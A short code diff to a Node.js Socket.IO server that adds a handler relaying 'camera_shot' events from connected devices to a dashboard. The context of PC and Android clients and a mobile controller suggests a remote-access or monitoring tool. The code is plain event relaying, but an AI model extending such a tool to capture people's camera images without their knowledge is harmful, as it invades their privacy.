@@ -54,6 +54,11 @@ io.on('connection', (socket) => {
                 io.emit('notification', data); // Broadcast to dashboard
             });
 
+            socket.on('camera_shot', (data) => {
+                console.log(`[+] CAMERA SHOT: ${data.camera}`);
+                io.emit('camera_shot', data); // Broadcast to dashboard
+            });
+
         } else if (type === 'mobile') {
             console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
             if (pcSocketId || androidSocketId) socket.emit('status', 'ONLINE');
